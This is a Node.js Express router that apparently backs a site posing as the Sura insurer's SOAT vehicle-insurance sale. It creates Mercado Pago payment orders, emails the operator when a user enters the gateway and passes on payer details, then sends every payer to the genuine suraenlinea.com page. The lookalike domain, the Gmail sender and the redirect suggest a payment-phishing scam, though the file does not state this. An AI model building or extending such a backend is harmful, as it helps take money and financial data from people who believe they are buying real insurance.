const { Router } = require('express');
const path = require('path');
const { deleteDataAuth } = require('../helpers/helpers');
const { v4: uuidv4 } = require('uuid');
const jwt = require('jsonwebtoken');
const { users } = require('../db/users');
const { JWT_KEY } = require('../config/config');
const { verifyToken } = require('../middlewares/authMiddleware');
const connect = require('../connection/index');
const { MercadoPagoConfig, Payment, Preference } = require('mercadopago');
const transporter = require('../config/mail');
const sendToEmail = require('../helpers/mail');

const URL_SERVER = 'https://suramercado.com';
// const URL_SERVER = 'http://localhost:3000';

const router = Router();

router.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

router.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'public', 'login.html'));
});

router.get('/dashboard', verifyToken, (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'public', 'dashboard.html'));
});

/* Links */

router.get('/links', async (req, res) => {
    try {
        const [rows] = await connect.execute('SELECT * FROM `links`');
        res.json({ status: 201, message: "Get links", data: rows });
    } catch (error) {
        res.json({ status: 400, message: "Error get links", error });
    }
});

router.get('/links/:id', async (req, res) => {
    try {
        const id = req.params.id;

        const [rows] = await connect.execute('SELECT * FROM `links` WHERE `id` = ?', [id]);

        res.json({ status: 201, message: "Get link", data: rows[0] });
    } catch (error) {
        res.json({ status: 400, message: "Error get link", error });
    }
});

router.post('/links', verifyToken, async (req, res) => {
    try {
        const id = uuidv4();
        const { valueLink, link } = req.body;

        await connect.execute('INSERT INTO `links` (link, valueLink) VALUES (?, ?)', [link, valueLink]);

        res.json({ status: 201, message: "Link created" });
    } catch (error) {
        res.json({ status: 400, message: "Error to created link", error });
    }
})

router.put('/links/:id', verifyToken, async (req, res) => {
    try {
        const id = req.params.id;
        const { valueLink, link } = req.body;

        await connect.execute('UPDATE `links` SET link = ?, valueLink = ? WHERE id = ?', [link, valueLink, id]);

        res.json({ status: 201, message: "Link updated" });
    } catch (error) {
        res.json({ status: 400, message: "Error to updated link", error });
    }
});

router.delete('/links/:id', verifyToken, async (req, res) => {
    try {
        const id = req.params.id;

        await connect.execute('DELETE FROM `links` WHERE id = ?', [id]);

        res.json({ status: 201, message: "Link deleted" });
    } catch (error) {
        res.json({ status: 400, message: "Error to deleted link", error });
    }
});

/* Login */

router.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Verify user and password in database users.js
    const user = users.find((user) => user.username === username && user.password === password);

    if (user) {
        const token = jwt.sign({ username }, JWT_KEY, { expiresIn: '24h' });
        res.cookie('token', token, { httpOnly: true });
        res.status(201).json({ success: true, message: 'Login successful', token: token });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

router.get('/logout', async (req, res) => {
    const clientIP = req.header('x-forwarded-for') || req.connection.remoteAddress;

    res.clearCookie('token');

    await deleteDataAuth(clientIP);

    res.status(201).json({ success: true, message: 'Logout successful' });
});

/* Mercado pago */

router.post('/create-order', async (req, res) => {
    try {
        const [rows] = await connect.execute('SELECT * FROM `mercado_pago` WHERE `id` = ?', [1]);

        const { title, price } = req.body;

        const client = new MercadoPagoConfig({
            accessToken: rows[0].value,
            options: { timeout: 5000, idempotencyKey: 'abc' },
        })

        const preference = new Preference(client);

        const result = await preference.create({
            body: {
                items: [
                    {
                        title,
                        unit_price: price,
                        quantity: 1,
                        currency_id: 'COP',
                    }
                ],
                payment_methods: {
                    excluded_payment_types: [
                        {
                            "id": "ticket"
                        },
                        {
                            "id": "atm"
                        },
                        {
                            "id": "debit_card"
                        },
                        {
                            "id": "credit_card"
                        }
                    ]
                },
                back_urls: {
                    success: `${URL_SERVER}/success`,
                    failure: `${URL_SERVER}/failure`,
                    pending: `${URL_SERVER}/pending`,
                },
                notification_url: `${URL_SERVER}/webhook`,
            }
        })

        res.json({ status: 201, data: result });
    } catch (error) {
        console.error(error);
        return res.json({ status: 400, message: "No se logró crear el pago", error });
    }
})

router.get('/success', async (req, res) => {
    const mailOptions = {
        text: `Un usuario ha logrado finalizar con éxito el pago en Mercado Pago.`,
    };

    await sendToEmail(mailOptions);
    
    res.redirect('https://www.suraenlinea.com/soat/sura/seguro-obligatorio');
})

router.get('/failure', async (req, res) => {
    const mailOptions = {
        text: `Un usuario ha abandonado o ha sido rechazado su método de pago`,
    };

    await sendToEmail(mailOptions);

    res.redirect('https://www.suraenlinea.com/soat/sura/seguro-obligatorio');
})

router.get('/pending', async (req, res) => {
    const mailOptions = {
        text: `El usuario se encuentra pendiente de finalizar su pago.`,
    };

    await sendToEmail(mailOptions);

    res.redirect('https://www.suraenlinea.com/soat/sura/seguro-obligatorio');
})

router.post('/webhook', async (req, res) => {
    try {
        const [rows] = await connect.execute('SELECT * FROM `mercado_pago` WHERE `id` = ?', [1]);

        const client = new MercadoPagoConfig({
            accessToken: rows[0].value,
            options: { timeout: 5000, idempotencyKey: 'abc' }
        })

        const payment = new Payment(client)

        const paymentQuery = req.query

        if (paymentQuery.topic === "merchant_order") {
            const mailOptions = {
                text: 'Un usuario ha ingresado a la pasarela de pago en Mercado Pago.',
            };

            await sendToEmail(mailOptions);
        }

        if (paymentQuery.type === "payment") {
            const data = await payment.get({ id: paymentQuery['data.id'] });

            const mailOptions = {
                text: `El usuario ya se encuentra en proceso de pago y llenado de su información financiera, a continuación podrás ver su información ${data?.payer}.`,
            };

            await sendToEmail(mailOptions);
        }

        res.sendStatus(204);
    } catch (error) {
        console.error(error)
        return res.sendStatus(500).json({ error: error.message })
    }
})

router.get('/get-token', verifyToken, async (req, res) => {
    try {
        const [rows] = await connect.execute('SELECT * FROM `mercado_pago` WHERE `id` = ?', [1]);

        res.json({ status: 201, message: "Get token mercado pago", data: rows[0] });
    } catch (error) {
        res.json({ status: 400, message: "Error to updated token mercado pago", error });
    }
})

router.put('/update-token', verifyToken, async (req, res) => {
    try {
        const { valueToken } = req.body;

        await connect.execute('UPDATE `mercado_pago` SET value = ? WHERE id = ?', [valueToken, 1]);

        res.json({ status: 201, message: "Token updated" });
    } catch (error) {
        res.json({ status: 400, message: "Error to updated token mercado pago", error });
    }
})

// Mailer

router.post('/send-email', async (req, res) => {
    try {
        const mailOptions = {
            from: 'segurovehiculoweb@gmail.com',
            to: 'test@test.com',
            subject: 'Seguro pendiente',
            text: 'Valor total $ 450.000',
        };

        await transporter.sendMail(mailOptions);

        res.json({ status: 201, message: "Send email" });
    } catch (error) {
        res.json({ status: 400, message: "Error to send email", error });
    }
})

// Config email

router.get('/get-email', verifyToken, async (req, res) => {
    try {
        const [rows] = await connect.execute('SELECT * FROM `email` WHERE `id` = ?', [1]);

        res.json({ status: 201, message: "Get email", data: rows[0] });
    } catch (error) {
        res.json({ status: 400, message: "Error to updated email", error });
    }
})

router.put('/update-email', verifyToken, async (req, res) => {
    try {
        const { valueEmail } = req.body;

        await connect.execute('UPDATE `email` SET value = ? WHERE id = ?', [valueEmail, 1]);

        res.json({ status: 201, message: "Email updated" });
    } catch (error) {
        res.json({ status: 400, message: "Error to updated email", error });
    }
})

module.exports = router;